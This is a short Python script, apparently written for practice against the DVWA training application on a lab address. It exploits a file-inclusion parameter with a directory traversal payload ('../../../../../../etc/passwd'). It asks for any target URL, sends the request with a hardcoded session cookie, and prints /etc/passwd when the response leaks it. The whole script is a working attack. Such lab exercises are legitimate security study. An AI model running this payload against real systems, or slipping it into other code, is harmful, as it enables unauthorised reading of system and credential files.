"""
Here is the URL we're testing on
http://10.0.0.217/DVWA/vulnerabilities/fi/?page=include.php
"""

import requests

# Need to use a cookie in order to get past admin page on DVWA, obviously this wouldn't happen in nature
cookie = {"PHPSESSID" : "7894ea9b4da9adba8ad39be0af5b9f8d", "security": "low" }

# Taking in our input
input_url = input("Enter URL possibly vuln to dir traversal: ")

# Replacing vulnerable bit of input with our traversal payload
mal_url = input_url.replace('include.php', '../../../../../../etc/passwd' )

# Making our request with the now malicious URL
mal_response = requests.get(mal_url, cookies=cookie)


# Only printing if etc passwd was shown, and only printing that file
if "root:x:0:0:" in mal_response.text:
    print("VULNERABLE")

    for line in mal_response.text.splitlines():
        if "<!DOCTYPE html>" in line:
            break
        print(line)
